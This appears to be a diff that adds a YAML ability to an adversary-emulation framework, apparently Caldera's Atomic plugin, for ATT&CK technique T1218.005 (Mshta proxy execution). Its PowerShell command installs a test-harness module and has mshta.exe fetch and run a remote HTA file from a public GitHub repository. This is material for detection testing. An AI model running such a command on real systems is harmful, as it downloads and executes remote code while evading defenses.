@@ -1,0 +1,19 @@
+- description: Executes an HTA Application by directly downloading from remote URI.
+  id: 748882ea-ad1b-31e8-f90d-9b31692200fe
+  name: Invoke HTML Application - Direct download from URI
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable;
+          if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope
+          CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta
+          -MSHTAFilePath $env:windir\system32\mshta.exe
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.005
+    name: 'Signed Binary Proxy Execution: Mshta'
